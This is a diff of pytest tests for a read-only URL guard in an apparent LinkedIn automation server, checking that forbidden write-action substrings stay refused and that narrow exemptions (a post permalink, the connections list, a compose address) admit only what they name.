+    live = set(readonly._FORBIDDEN_URL_SUBSTRINGS)
+    lost = [
+        entry
+        for entry in FORBIDDEN_SUBSTRINGS_EVER
+        if entry not in live
+        and entry not in FORBIDDEN_SUBSTRINGS_DELIBERATELY_REMOVED
+    ]
+    assert not lost, (
+        f"these substrings left the forbidden list: {lost}. Each one was a "
+        "refusal somebody wrote deliberately. Removing one is a boundary "
+        "change, not a tidy-up -- if it was intended, record it in "
+        "FORBIDDEN_SUBSTRINGS_DELIBERATELY_REMOVED with the ruling, which is "
+        "an edit somebody reviews rather than a digest somebody re-bakes."
+    )
+    # AND THE EXCEPTION LIST CANNOT ROT INTO A BLANKET. Every entry in it must
+    # name a substring the roster remembers AND one that is really gone; an
+    # entry for a live substring would sit there granting nothing and hiding
+    # the next real removal behind a stale name.
+    for entry in FORBIDDEN_SUBSTRINGS_DELIBERATELY_REMOVED:
+        assert entry in FORBIDDEN_SUBSTRINGS_EVER, entry
+        assert entry not in live, (
+            f"{entry!r} is recorded as deliberately removed and is on the "
+            "live forbidden list. One of the two is wrong."
+        )
+
+
+#: The members of the ``/feed/update`` family that must stay refused now that
+#: the substring guarding all of them is gone. Each is a real address put
+#: through the real guard, and each names the entry that is expected to catch
+#: it, so a refusal that started coming from somewhere else is visible.
+FEED_UPDATE_FAMILY_STILL_REFUSED = (
+    ("https://www.linkedin.com/feed/update/urn:li:activity:7400000000000000001/edit/", "/edit/"),
+    ("https://www.linkedin.com/feed/update/urn:li:activity:7400000000000000001/delete", "/delete"),
+    ("https://www.linkedin.com/feed/update/urn:li:activity:7400000000000000001/?action=delete", "action="),
+)
+
+
+@pytest.mark.parametrize(
+    "url,expected_gate", FEED_UPDATE_FAMILY_STILL_REFUSED, ids=lambda v: str(v)[:40]
+)
+def test_the_removed_substring_did_not_take_the_family_with_it(url, expected_gate):
+    """THE PRICE OF THE REMOVAL, PAID IN ASSERTIONS RATHER THAN IN PROSE.
+
+    ``/feed/update`` left the forbidden tuple so that ONE item permalink could
+    be admitted. The argument for that being acceptable is that the family's
+    DESTRUCTIVE members are caught by other entries which are all still there
+    -- and an argument of that shape is exactly the kind this repository has
+    twice found to be false when finally measured. ``/settings/`` sat on the
+    list for the life of the repo matching nothing LinkedIn served; the two
+    account-ending pages were assumed covered by a substring that does not
+    appear in either address.
+
+    So this does not reason about it. It puts each address through
+    ``assert_read_url`` and reads back WHICH substring refused it, so a
+    refusal that quietly started coming from the allowlist instead -- which is
+    a single loosened pattern away from not coming at all -- fails here.
+    """
+    with pytest.raises(readonly.WriteAttemptError) as excinfo:
+        readonly.assert_read_url(url)
+    message = str(excinfo.value)
+    assert expected_gate in message, message
+    # THE GATE, NOT MERELY THE ANSWER. The forbidden loop and the allowlist
+    # produce different sentences, and only the first is the second,
+    # independent gate this family now depends on entirely.
+    assert "is not a read surface" in message, message
+
+
+def test_the_permalink_that_bought_the_removal_is_the_only_thing_it_bought():
+    """AND THE NARROWNESS, from the other side.
+
+    One url shape opens. The bare family root does not, a percent-encoded urn
+    does not -- that spelling has never been observed in this position -- and
+    a query string does not, so LinkedIn's own tracking parameters cannot ride
+    in on it.
+    """
+    urn = "urn:li:activity:7400000000000000001"
+    base = "https://www.linkedin.com/feed/update/"
+    assert readonly.is_read_url(f"{base}{urn}/")
+    assert readonly.is_read_url(f"{base}{urn}")
+    assert not readonly.is_read_url(base)
+    assert not readonly.is_read_url(f"{base}{urn}/?trk=feed")
+    assert not readonly.is_read_url(
+        base + "urn%3Ali%3Aactivity%3A7400000000000000001/"
+    )
+    # THE SHAPE IS THE READER'S OWN, not a second spelling written here. The
+    # only urns this server can build a permalink from are the ones
+    # dom.ACTIVITY_ITEMS_JS will emit, and if that shape ever widened without
+    # this pattern following, a key would come back that no url could be built
+    # from -- which fails loudly rather than opening anything, and is still
+    # worth catching here.
+    assert "urn:li:[A-Za-z]+:[0-9]+" in dom.ACTIVITY_ITEMS_JS.replace(
+        "^urn:li:[A-Za-z]+:[0-9]+$", "urn:li:[A-Za-z]+:[0-9]+"
+    )
+    assert any(
+        "urn:li:[A-Za-z]+:[0-9]+" in pattern.pattern
+        for pattern in readonly._ALLOWED_URL_PATTERNS
+    )
+
+
+def test_that_roster_check_can_fail_on_a_deletion():
+    """SHOWN FAILING, on the exact edit it exists to catch.
+
+    Without this the test above is a subset assertion that a list which never
+    shrinks would pass forever without anyone knowing whether it CAN fail.
+    """
+    weakened = tuple(
+        entry
+        for entry in readonly._FORBIDDEN_URL_SUBSTRINGS
+        if entry != "/messaging/compose"
+    )
+    assert len(weakened) == len(readonly._FORBIDDEN_URL_SUBSTRINGS) - 1
+    lost = [
+        entry
+        for entry in FORBIDDEN_SUBSTRINGS_EVER
+        if entry not in set(weakened)
+        and entry not in FORBIDDEN_SUBSTRINGS_DELIBERATELY_REMOVED
+    ]
+    assert lost == ["/messaging/compose"], lost
+    # THE CONTROL ON THE EXCEPTION MECHANISM ITSELF, added with it. A recorded
+    # removal must silence EXACTLY its own entry and nothing else, or the list
+    # is an off switch rather than a ledger.
+    assert "/messaging/compose" not in FORBIDDEN_SUBSTRINGS_DELIBERATELY_REMOVED
+
+
+@pytest.mark.parametrize("url", MUST_STAY_UNREADABLE)
+def test_no_previously_forbidden_address_became_readable(url):
+    """THE BEHAVIOURAL FREEZE, and it exists because the string freeze missed
+    something for the entire life of this repository.
+
+    ``"/settings/"`` has been on the forbidden list since the beginning. On
+    2026-08-30 it was measured against LinkedIn's actual settings addresses --
+    ``/mypreferences/d/`` and ``/psettings/`` -- and matched NEITHER. The
+    roster check above would have passed every single day of that, because the
+    string was present; what was absent was any address it caught.
+
+    A boundary is a set of addresses that cannot be opened, not a set of
+    strings that appear in a tuple. This asserts the addresses.
+    """
+    assert not readonly.is_read_url(url), (
+        f"{url} became readable. Every url here is one this repository has "
+        "decided it will not open, and each is refused today."
+    )
+
+
+# ---------------------------------------------------------------------------
+# HIS OWN CONNECTIONS LIST: a write guard that was matching a read address
+# ---------------------------------------------------------------------------
+#
+# THE QUESTION THAT FOUND IT was the operator's, not an audit's: why must he
+# supply a profile url -- why can this server not find a person in his own
+# network? It could not, because ``/invite`` and ``/connect`` are on the
+# forbidden list to stop this server SENDING invitations, and they also catch
+# ``/mynetwork/invite-connect/connections/``, which sends nothing and invites
+# nobody. It is the page listing people he is ALREADY connected to.
+#
+# WHY IT MATTERS BEYOND ONE PAGE. The identifier route needs a surface that
+# draws Message buttons, because that is where ``recipient_id`` comes from.
+# Who's-Viewed-Me was the only readable one and it is the wrong surface: it
+# lists whoever happened to look, so an authorised target who has not viewed
+# his profile is unreachable, and one who has may still carry
+# ``recipient_id: null`` where LinkedIn drew no button.
+CONNECTIONS_URL = (
+    "https://www.linkedin.com/mynetwork/invite-connect/connections/"
+)
+
+
+def test_the_connections_list_is_readable():
+    """Both spellings, because the pattern ends at an optional slash."""
+    assert readonly.is_read_url(CONNECTIONS_URL)
+    assert readonly.is_read_url(CONNECTIONS_URL.rstrip("/"))
+
+
+def test_that_address_trips_two_forbidden_substrings():
+    """THE FACT THAT FORCED THE MECHANISM TO CHANGE, asserted rather than
+    described.
+
+    Every earlier exemption excused ONE substring, and the table held one
+    string per pattern. This address carries ``/invite`` AND ``/connect``, so
+    a mechanism returning a single substring could only ever excuse half of it
+    -- the url would still refuse, for a reason nothing in the table could
+    state. If this ever drops to one, the set is no longer load-bearing and
+    the simpler shape should come back.
+    """
+    tripped = {
+        bad
+        for bad in readonly._FORBIDDEN_URL_SUBSTRINGS
+        if bad in CONNECTIONS_URL.lower()
+    }
+    assert tripped == {"/invite", "/connect"}, tripped
+
+
+def test_the_exemption_names_exactly_those_two_and_no_more():
+    """A SET IS NOT A WILDCARD. What an entry excuses stays enumerated."""
+    excused = readonly._pattern_exempted_substrings(CONNECTIONS_URL)
+    assert excused == frozenset({"/invite", "/connect"}), excused
+    # And it excuses them for THIS address only.
+    assert readonly._pattern_exempted_substrings(
+        "https://www.linkedin.com/mynetwork/invite-connect/invitations/"
+    ) == frozenset()
+
+
+def test_both_gates_are_required_and_neither_alone_admits_it():
+    """SHOWN FAILING, one gate at a time.
+
+    The exemption says which forbidden substrings the url may carry; the
+    allowlist says the url is a permitted read. A test that only checked the
+    happy path would pass if either gate were deleted, which is exactly how a
+    boundary widens without anybody noticing.
+    """
+    original = readonly._FORBIDDEN_SUBSTRING_PATTERN_EXEMPTIONS
+    try:
+        readonly._FORBIDDEN_SUBSTRING_PATTERN_EXEMPTIONS = tuple(
+            (pattern, substrings)
+            for pattern, substrings in original
+            if "mynetwork" not in pattern.pattern
+        )
+        assert not readonly.is_read_url(CONNECTIONS_URL), (
+            "the connections url is admitted with its exemption removed, so "
+            "the forbidden substrings are no longer being checked at all"
+        )
+    finally:
+        readonly._FORBIDDEN_SUBSTRING_PATTERN_EXEMPTIONS = original
+    assert readonly.is_read_url(CONNECTIONS_URL)
+
+    allowed = readonly._ALLOWED_URL_PATTERNS
+    try:
+        readonly._ALLOWED_URL_PATTERNS = tuple(
+            pattern for pattern in allowed if "invite-connect" not in pattern.pattern
+        )
+        assert not readonly.is_read_url(CONNECTIONS_URL), (
+            "the connections url is admitted with its allowlist pattern "
+            "removed, so the exemption alone is opening it"
+        )
+    finally:
+        readonly._ALLOWED_URL_PATTERNS = allowed
+    assert readonly.is_read_url(CONNECTIONS_URL)
+
+
+def test_the_compose_exemption_still_excuses_exactly_one():
+    """THE ENTRY THAT DID NOT CHANGE, asserted because the mechanism did.
+
+    Widening a shared mechanism is how a neighbouring permission grows by
+    accident. The compose address excused one substring before the value
+    became a set and must excuse exactly that one after.
+    """
+    compose = (
+        "https://www.linkedin.com/messaging/compose/"
+        "?profileUrn=urn%3Ali%3Afsd_profile%3AACoAAB7hidden"
+        "&recipient=ACoAAB7hidden"
+    )
+    assert readonly._pattern_exempted_substrings(compose) == frozenset(
+        {"/messaging/compose"}
+    )
+    assert readonly.is_read_url(compose)
